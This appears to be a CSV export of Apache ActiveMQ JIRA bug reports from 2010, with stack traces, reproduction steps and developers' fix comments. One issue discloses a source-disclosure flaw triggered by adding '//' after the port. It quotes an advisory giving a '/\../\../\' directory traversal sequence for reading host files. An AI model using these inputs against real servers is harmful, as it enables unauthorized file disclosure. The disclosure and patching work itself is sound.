The workaround is to always use non-transacted QueueBrowsers and manually handle any issues if you try to consume a message found in the QueueBrowser.",,nedenom@hotmail.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Apr/10 16:43;dnawrocki;JmsTransactedQueueBrowserTest.java;https://issues.apache.org/jira/secure/attachment/12461680/JmsTransactedQueueBrowserTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74834,,,Mon Aug 09 21:00:54 UTC 2010,,,,,,,,,,,"0|i0rq27:",159866,,,,,,,,,,,,,,,,,,,,,"23/Apr/10 16:43;dnawrocki;Unit test for the failure.;;;","09/Aug/10 21:00;tabish;Fixed the issues in the provided test (transacted producers didn't have a session.commit) and ran against trunk, all tests pass.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-protobuf: AltJavaGenerator generates syntactically incorrect Java for nested Messages,AMQ-2707,12483423,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,richard.barnett,richard.barnett,23/Apr/10 03:11,23/Apr/10 12:48,14/Jul/23 05:43,23/Apr/10 12:48,,,,,,,,,,,,,0,,,,,,,,,"I built activemq-protobuf from http://svn.apache.org/repos/asf/activemq/activemq-protobuf/trunk/ (r817001).
I changed the configuration of the activemq-protobuf plugin in the activemq-protobuf-test pom.xml to use type {{alt}}.
The plugin generates invalid Java for .proto files defining nested messages.

An example:

{code:title=Simple.proto}
package foo;

message Outer {
  message Inner {
    required string x = 1;
  }
  required Inner inner = 1;
}
{code}

generates code including a method {{Simple.Outer.OuterBean.readExternal}}:

{code:title=Simple.java}
public void readExternal(java.io.DataInput in) throws java.io.IOException {
  assert frozen==null : org.apache.activemq.protobuf.MessageBufferSupport.FORZEN_ERROR_MESSAGE;
  bean = this;
  frozen = null;
  if( in.readBoolean() ) {
    Outer.Inner.Outer.InnerBean o = new Outer.Inner.Outer.InnerBean();
    o.readExternal(in);
    f_inner = o;
  } else {
    f_inner = null;
  }
}
{code}

which fails to compile; it should refer to {{Outer.Inner.InnerBean}} rather than {{Outer.Inner.Outer.InnerBean}}.

I'm attaching a zip containing a patch which I've tested with 4 levels of nesting, & some test .proto files.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Apr/10 03:15;richard.barnett;AMQ-2707.zip;https://issues.apache.org/jira/secure/attachment/12461679/AMQ-2707.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74835,,,Fri Apr 23 12:48:35 UTC 2010,,,,,,,Patch Available,,,,"0|i182tz:",255261,,,,,,,,,,,,,,,,,,,,,"23/Apr/10 03:15;richard.barnett;Zip contains:
- Patch to AltJavaGenerator to handle nested messages
- Simple.proto & Test.proto used for testing;;;","23/Apr/10 12:48;chirino;Awesome.  Thanks!  patch applied in rev 937273;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak & huge thread count in broker,AMQ-2706,12483291,12483633,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,kalamaks,kalamaks,22/Apr/10 14:15,20/May/10 11:02,14/Jul/23 05:43,07/May/10 15:52,5.3.1,,,,,5.4.0,,,,,,,0,,,,,,,,,"I'm using request/replay pattern where client on BrokerA  creates message and start listening response from temporary-queue, consumer listening on BrokerB, after getting message it sends respond back to the temporary queue.
After getting message back, client on BrokerA removes temporary queue and closes session and closes connection
Now if I take a look to the jmx then everythink is OK on BrokerA side. No hangig tmp queues no too many threads. On BrokerB every message lives hanging temporary queue and thread. Even if I shut down BrokerA there are still hanging tmp queue on brokerB and one extra thread.
Now if I send 10k messages from BrokerA there is 10K temporary quest and 10K threads on brokerA

Example setup:

| Broker A  <NetworkConnector duplex=true> | ----->  |  Broker B |


","Linux ubuntu/Java HotSpot(TM) 64-Bit Server VM (build 14.1-b02, mixed mode)",kalamaks,mpaladin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Apr/10 14:23;kalamaks;memtest.zip;https://issues.apache.org/jira/secure/attachment/12461677/memtest.zip","22/Apr/10 14:17;kalamaks;snapshot6.png;https://issues.apache.org/jira/secure/attachment/12461675/snapshot6.png","22/Apr/10 14:17;kalamaks;snapshot7.png;https://issues.apache.org/jira/secure/attachment/12461676/snapshot7.png",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74836,,,Fri May 07 18:47:36 UTC 2010,,,,,,,,,,,"0|i0rpuv:",159833,,,,,,,,,,,,,,,,,,,,,"22/Apr/10 14:17;kalamaks;JMX consle;;;","22/Apr/10 14:23;kalamaks;there is 2 classes (Client = BrokerA  and Server = BrokerB ) for reproducing a problem;;;","07/May/10 15:52;dejanb;Fixed with svn revision 942131.

The problem was with destination infos not being propagated to the remote broker, so temp destination were kept lingering.

However, I think your solution with new temp queue for every message is not optimal, and you should use one temp queue and correlation id. See http://activemq.apache.org/how-should-i-implement-request-response-with-jms.html for more info;;;","07/May/10 18:47;kalamaks;tnx Dejan;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Non durable TopicSubscriptions can get duplicate messages in a network of brokers ring - suppression works in the stores and for durables,AMQ-2704,12483424,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,21/Apr/10 14:01,21/Apr/10 16:48,14/Jul/23 05:43,21/Apr/10 16:48,5.3.1,,,,,5.4.0,,,,,,,0,,,,,,,,,"With a ring topology some duplicates are inevitable, Brokers A,B,C,D - producer on A, consumer on C, paths A-B-C and A-D-C are identical. When the subscription is backed by a store, the store traps/suppresses the duplicate. A regular Topic sub does not have such suppression as it does not use a message cursor, just regular direct dispatch.
A regular topic sub needs some duplicate suppression in line with the PolicyEntry enableAudit.",,mpaladin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74837,,,Wed Apr 21 16:48:23 UTC 2010,,,,,,,,,,,"0|i0rq07:",159857,,,,,,,,,,,,,,,,,,,,,"21/Apr/10 16:48;gtully;resolved in r936390

TopicSubscription now respects the PolicyEntry.enableAudit (enabled once a matching policy entry is found) which allows duplicates to be suppressed in the same way as the message stores and cursors suppress duplicates.
A topic sub in a ring network will not now get duplicate messages.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Mix of Persistent and Non-Persistent producers on the same queue breaks producer flow control,AMQ-2703,12483622,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,frbo,frbo,21/Apr/10 12:22,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.0,5.3.1,,,,5.6.0,,,,,,,0,,,,,,,,,"To reproduce this bug I will attach the source of two small test applications:
# ProducerFlowControlTest.java
# FastProducer.java

Both applications connect to a standalone broker on the same machine. For the broker I'm using the default configuration that comes with the 5.3.1 download.

The ProducerFlowControlTest program does two things:
# Read incoming messages from a queue
# Once every 3 seconds: post a message on this incoming queue (from a different thread, so using a different session). Posting is done in a NON_PERSISTENT way.

The FastProducer sends some big text messages to the queue to trigger the 'producer flow control'. It uses PERSISTENT delivery.

After a while this will get stuck and the FastProducer is not able to deliver all its messages.
Instead of seeing something like this in the output:
{noformat}
Received message of size: 47000
Received message of size: 47000
Received message of size: 11
Published message on queue
Received message of size: 47000
Received message of size: 47000
Received message of size: 11
{noformat}

You see this:
{noformat}
Published message on queue
Received message of size: 47000
Received message of size: 47000
Published message on queue
Published message on queue
Published message on queue
Published message on queue
Published message on queue
Published message on queue
...
{noformat}

If you change the delivery of the messages in ProducerFlowControlTest to PERSISTENT, then everything works fine!
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Apr/10 12:24;frbo;FastProducer.java;https://issues.apache.org/jira/secure/attachment/12461673/FastProducer.java","21/Apr/10 12:24;frbo;ProducerFlowControlTest.java;https://issues.apache.org/jira/secure/attachment/12461672/ProducerFlowControlTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60030,,,Tue Sep 20 11:01:39 UTC 2011,,,,,,,,,,,"0|i0akgv:",59589,,,,,,,,,,,,,,,,,,,,,"17/Aug/10 19:42;tabish;Can you try against the 5.4.0 release, I've run the apps locally using that release and can't seem to reproduce the problem.;;;","29/Jun/11 21:48;tabish;Unable to reproduce this using current release.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot rename file,AMQ-2701,12483429,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,bbuzzard,bbuzzard,20/Apr/10 14:03,20/Apr/10 16:07,14/Jul/23 05:43,20/Apr/10 16:07,,,,,,,,,,,,,0,,,,,,,,,"I'm not sure if this issue should be reported here or in the Apache-Camel project.  Please let me know if I've logged it in the wrong place.  I have a drop folder used for testing called ""c:\esb\aaa"".  I have the route in the apache-activemq-5.3.0\webapps\camel\WEB-INF\applicationContext.xml file set up to route files from ""c:\esb\aaa"" to ""activemq:testQ"".  When I drop a file in the folder it appears to make it into the queue.  I see a camelLock file appear in the drop folder temporarily, but when it disappears the original file that I dropped remains and was not moved to the "".camel"" subfolder.  I can do the samething from my WindowsXP Laptop and it works, so I'm not sure what the problem is or how to track it down.  Here's my stacktrace:

org.apache.camel.component.file.GenericFileOperationFailedException: Cannot rename file: GenericFile[c:\esb\aaa\Test4.txt] to: GenericFile[c:\esb\aaa\.camel\Test4.txt]
	at org.apache.camel.component.file.strategy.GenericFileRenameProcessStrategy.renameFile(GenericFileRenameProcessStrategy.java:96)
	at org.apache.camel.component.file.strategy.GenericFileRenameProcessStrategy.commit(GenericFileRenameProcessStrategy.java:72)
	at org.apache.camel.component.file.GenericFileOnCompletion.processStrategyCommit(GenericFileOnCompletion.java:120)
	at org.apache.camel.component.file.GenericFileOnCompletion.onCompletion(GenericFileOnCompletion.java:82)
	at org.apache.camel.component.file.GenericFileOnCompletion.onComplete(GenericFileOnCompletion.java:50)
	at org.apache.camel.impl.DefaultUnitOfWork.done(DefaultUnitOfWork.java:115)
	at org.apache.camel.processor.UnitOfWorkProcessor.processNext(UnitOfWorkProcessor.java:60)
	at org.apache.camel.processor.DelegateProcessor.process(DelegateProcessor.java:48)
	at org.apache.camel.component.file.GenericFileConsumer.processExchange(GenericFileConsumer.java:198)
	at org.apache.camel.component.file.GenericFileConsumer.processBatch(GenericFileConsumer.java:120)
	at org.apache.camel.component.file.GenericFileConsumer.poll(GenericFileConsumer.java:93)
	at org.apache.camel.impl.ScheduledPollConsumer.run(ScheduledPollConsumer.java:99)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:441)
	at java.util.concurrent.FutureTask$Sync.innerRunAndReset(FutureTask.java:317)
	at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:150)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$101(ScheduledThreadPoolExecutor.java:98)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.runPeriodic(ScheduledThreadPoolExecutor.java:181)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:205)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)","Windows Server 2008 R2 Standard, JDK1.6.0_18, Apache-ActiveMQ-5.3.0",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74838,,,Tue Apr 20 16:07:08 UTC 2010,,,,,,,,,,,"0|i0s08f:",161514,,,,,,,,,,,,,,,,,,,,,"20/Apr/10 14:16;gtully;you should use the Camel jira for this issue with the camel file component;;;","20/Apr/10 16:07;bbuzzard;See Camel 2661;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Apache ActiveMQ is prone to source code disclosure vulnerability.,AMQ-2700,12483248,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,veerendragg,veerendragg,20/Apr/10 11:25,22/Jun/10 08:06,14/Jul/23 05:43,21/Apr/10 10:19,5.3.1,,,,,5.3.2,5.4.0,,,,,,0,,,,,,,,,"An input validation error is present in Apache ActiveMQ. Adding '//' after the
port in an URL causes it to disclose the JSP page source.

This has been tested on various admin pages,
admin/index.jsp, admin/queues.jsp, admin/topics.jsp etc.

NOTE : Refer attached file for complete information/advisory.",Linux/Windows environment,veerendragg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Apr/10 11:28;veerendragg;SECPOD_ActiveMQ.txt;https://issues.apache.org/jira/secure/attachment/12461671/SECPOD_ActiveMQ.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74839,,,Tue Jun 22 08:06:02 UTC 2010,,,,,,,,,,,"0|i0rpo7:",159803,,,,,,,,,,,,,,,,,,,,,"20/Apr/10 11:28;veerendragg;Attached file is having complete information about the issue.;;;","21/Apr/10 10:19;dejanb;I confirmed this issue exists in 5.3.1 version, however it seems to be solved in trunk (5.4-snapshot) due to upgrade of jetty to 7.x.

After a bit of investigation it turns out to be a problem with Jetty's ResourceHandler. To work around this problem in 5.3.1, follow these steps:

1. go to the {{${ACTIVEMQ_HOME}/webapps}} dir
2. make new dir called static - {{mkdir static}}
3. move index.html file there - {{mv index.html static/}}
4. change ResourceHandler to use {{static}} dir . To do that, edit {{${ACTIVEMQ_HOME}/conf/jetty.xml}} and change ResourceHandler definition to 

{code}<bean class=""org.mortbay.jetty.handler.ResourceHandler"">
  <property name=""welcomeFiles"">
    <list>
      <value>index.html</value>
    </list>
  </property>
  <property name=""resourceBase"" value=""${activemq.base}/webapps/static""/>
</bean>{code};;;","21/Apr/10 10:46;dejanb;This workaround will be available in the next fuse 5.3.1-fuse-01-00 release (http://fusesource.com/), if anyone is interested.;;;","22/Apr/10 09:01;veerendragg;I am able to reproduce  this issue in 5.4-snapshot as well.;;;","22/Apr/10 10:19;dejanb;Hi Veerendra,

I just retested. The steps are following:

1. Download latest snapshot from https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.4-SNAPSHOT/apache-activemq-5.4-SNAPSHOT-bin.tar.gz

2. install and run

3. Try accessing http://localhost:8161//admin/queues.jsp

I'm getting 404 as expected. Can you try this latest snapshot, just to be sure we're looking at the same thing and send you log if you're seeing something else?;;;","22/Apr/10 11:04;veerendragg;Hi Dejan,

yeah, the issue has been fixed now.

Issue exists, when I downloaded from the same location and tested yesterday.

Thank you... :)


regards,
Veerendra;;;","28/May/10 12:15;gtully;does this resolve the following, looks like it does to me, same sort of issue about restricting access to the resource loader:

iDefense VCP Submission V-ay6t2oua0k
05/05/2010
Apache ActiveMQ Directory Traversal Vulnerability

Description: 
Remote exploitation of a directory traversal vulnerability in Apache Software Foundation's Apache ActiveMQ could allow an attacker to download files from a restricted directory, which can result in information disclosure.

Apache ActiveMQ is a messaging and enterprise integration patterns provider. The platform provides a Message Broker which handles communication between several different applications. Apache ActiveMQ supports many popular development languages including C/C++, Python, Java, and .NET. Apache ActiveMQ runs on a variety of platforms, including Windows, Linux and Solaris

For more information, see the vendor's site at the following link: http://activemq.apache.org

The vulnerability is due to a failure by the Message Broker to restrict directory traversals. As a result, sensitive locations outside the configured Message Broker restricted directory can be accessed by an attacker. No authentication is required to access the ActiveMQ Message Broker service. 

Analysis: 
Exploitation of this vulnerability could allow an attacker to gain control over the affected machine.

By specifying a URL location with multiple directory traversal sequences such as ""/\../\../\"", it is possible for an attacker to access sensitive files hosted on the Message Broker Server using the privileges associated with the Message Broker process. An attacker may be able to read important system files, which will result in information disclosure, and can potentially lead to full host compromise.

iDefense considers this vulnerability to be of MEDIUM severity because the vulnerability leads to information disclosure. 

Credit: 
AbdulAziz Hariri


;;;","04/Jun/10 11:17;dejanb;I cannot reproduce this either on 5.2.0 or 5.3.x. If anyone succeed, please provide steps and version of the broker.;;;","22/Jun/10 08:06;dejanb;Analyzed in a separate issue https://issues.apache.org/activemq/browse/AMQ-2788;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DefaultJDBCAdapter returns incorrect value that prevents ActiveMQ from starting.,AMQ-2696,12483433,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,andyg,andyg,14/Apr/10 12:29,17/May/11 21:29,14/Jul/23 05:43,15/Apr/10 13:56,5.3.1,,,,,5.4.0,,,Message Store,,,,0,,,,,,,,,"org.apache.activemq.store.jdbcJDBCPersistenceAdapter.getLastMessageBrokerSequenceId() calls:

org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter:

The call to doGetLastMessageStoreSequenceId will return the max acks table id if the max msgs id is less.

The result is used to seed the sequenceGenerator:

long seq =  getAdapter().doGetLastMessageStoreSequenceId(c);
sequenceGenerator.setLastSequenceId(seq);

However the next call to set the brokerSeq variable will fail if the seq variable has been seeded with the max acks id, as 'doGetMessageById' expects a valid msgs id.

long brokerSeq = 0;
            if (seq != 0) {
            	Message last = (Message)wireFormat.unmarshal(new ByteSequence(getAdapter().doGetMessageById(c, seq)));
            	brokerSeq = last.getMessageId().getBrokerSequenceId();
            }
            return brokerSeq;

If 'seq' is not a valid msgs id (I presume because the message has expired and/or been removed) then this causes a NullPointerException in ByteSequence, which is not caught, and this leads to a complete failure to start ActiveMQ.

The solution is not simple if the tables are in production, and is compounded even further by durable subscribers that cannot simply be deleted from the acks table.",Vista 64bit,andyg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2956,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74840,,,Mon Apr 19 14:55:18 UTC 2010,,,,,,,,,,,"0|i0rpov:",159806,,,,,,,,,,,,,,,,,,,,,"15/Apr/10 06:33;andyg;Also in trunk;;;","15/Apr/10 08:42;dejanb;Hi Andy,

just wondering if you can create a test case that can reproduce the issue? Or this is something you encountered in production?

Regards,
Dejan;;;","15/Apr/10 12:18;andyg;Hi Dejan,

It's going to be difficult to create a test case, but is easy to reproduce if you have any JDBC adapter configured.

<persistenceAdapter>
<jdbcPersistenceAdapter dataSource=""#postgresql-activemq-ds"">
<adapter>
<postgresql-jdbc-adapter/>
</adapter>
</jdbcPersistenceAdapter>
</persistenceAdapter>

Just change the DataSource database to an empty test database and let ActiveMQ create new empty tables.

Stop ActiveMQ.

Manually add one dummy row to the empty 'activemq_acks' table:

INSERT INTO activemq_acks(container, sub_dest, client_id, sub_name, selector, last_acked_id) VALUES ('topic://a', 'topic://a', 'a', 'a', 'a', 555);

Start ActiveMQ.

It will try to load message id 555 - which does not exist, and will drop a NullPointerException.

The code in doGetLastMessageStoreSequenceId uses Math.max(seq1, seq2) to determine the next sequence id, so this is then definitely not safe to use in getLastMessageBrokerSequenceId() to load a message by id.

I suppose a test case using something like Derby could be created - without looking, is Derby on the default test classpath?

Andy. ;;;","15/Apr/10 12:46;dejanb;Hi Andy,

no worries, I created a test case and will commit a fix soon.

Cheers;;;","15/Apr/10 13:28;andyg;Great stuff, many thanks!;;;","15/Apr/10 13:56;dejanb;This should be fixed on now with svn revision 934408.

JDBC store postpones deleting messages with min last seq id to the next iteration cycle. Also getting last broker sequence id procedure is also made resilient on these cases as they can still happen due to expired messages.;;;","19/Apr/10 14:55;andyg;
   [[ Old comment, sent by email on Thu, 15 Apr 2010 11:33:28 +0200 ]]

Hi Dejan,

It's going to be difficult to create a test case, but is easy to 
reproduce if you have any JDBC adapter configured.

<persistenceAdapter>
<jdbcPersistenceAdapter dataSource=""#postgresql-activemq-ds"">
<adapter>
<postgresql-jdbc-adapter/>
</adapter>
</jdbcPersistenceAdapter>
</persistenceAdapter>

Just change the DataSource database to an empty test database and let 
ActiveMQ create new empty tables.

Stop ActiveMQ.

Manually add one dummy row to the empty 'activemq_acks' table:

INSERT INTO activemq_acks(container, sub_dest, client_id, sub_name, 
selector, last_acked_id) VALUES ('topic://a', 'topic://a', 'a', 'a', 
'a', 555);

Start ActiveMQ.

It will try to load message id 555 - which does not exist, and will drop 
a NullPointerException.

The code in doGetLastMessageStoreSequenceId uses Math.max(seq1, seq2) to 
determine the next sequence id, so this is then definitely not safe to 
use in getLastMessageBrokerSequenceId() to load a message by id.

I suppose a test case using something like Derby could be created - 
without looking, is Derby on the default test classpath?

Andy.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Invalid messages in the pending queue of durable subscriptions.,AMQ-2695,12483900,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,akos.baraz,akos.baraz,13/Apr/10 09:45,23/Nov/10 19:39,14/Jul/23 05:43,23/Nov/10 19:39,5.3.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"Invalid messages appear in the pending queue of the durable subscriptions (with message selector) right after broker restart. These invalid messages are blocking the delivery of the newly produced ones.
As I see all messages appear in the pending queue what are produced on the topic (ever!!!) even if does not fulfills the selector.

Please, check my test case!
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jun/10 07:53;akos.baraz;SubscriptionSelectorTest.java;https://issues.apache.org/jira/secure/attachment/12461733/SubscriptionSelectorTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14738,,,Tue Nov 23 19:39:00 UTC 2010,,,,,,,,,,,"0|i0b9vz:",63714,,,,,,,,,,,,,,,,,,,,,"14/Jun/10 11:41;dejanb;Fixed with svn revision 954412

The problem was that KahaDB store didn't return a valid message count for the durable subscriber with selector (after the restart);;;","23/Nov/10 19:03;gtully;The existing solution can be improved from a performance perspective using the changes in https://issues.apache.org/activemq/browse/AMQ-2985.
The index, via acklocations contains all of the matched messages so the selectors need not be rerun to determine the available message count etc.;;;","23/Nov/10 19:39;gtully;r1038296, re implemented getMessageCount to use the just the index and remove the need to re run the selector.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"potential hang with failover, transactions and slow thread creation with outstanding commit - close blocks pending dispatch  FailoverConsumerOutstandingCommitTest intermittent failure",AMQ-2693,12482799,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,12/Apr/10 13:58,13/Jul/10 09:32,14/Jul/23 05:43,12/Apr/10 14:04,5.3.0,5.3.1,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"potential dead lock pending dispatch that is blocked by an outstanding commit after failover.

Log indicates:{code}
WARN  ActiveMQConnection             - dispatch paused, waiting for outstanding dispatch interruption processing (x) to complete..
{code}


Thread Dump:{code}
Full thread dump Java HotSpot(TM) Server VM (14.0-b16 mixed mode):
...
""ActiveMQ Transport: tcp:///127.0.0.1:49284"" daemon prio=3 tid=0x0068f800 nid=0x32 runnable [0x56ffe000]
   java.lang.Thread.State: RUNNABLE
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
	at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
	at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)
	at java.io.DataOutputStream.flush(DataOutputStream.java:106)
	at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:168)
	at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:243)
	- locked <0x5c2daab0> (a java.util.concurrent.atomic.AtomicBoolean)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:83)
	at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	- locked <0x5c2da520> (a java.lang.Object)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1205)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:790)
	at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:750)
	at org.apache.activemq.broker.region.PrefetchSubscription.dispatch(PrefetchSubscription.java:647)
	at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:592)
	- locked <0x5c2db3a0> (a java.lang.Object)
	- locked <0x5c2db3a8> (a java.lang.Object)
	at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:158)
	at org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:1548)
	at org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1500)
	- locked <0x5c2db500> (a java.util.ArrayList)
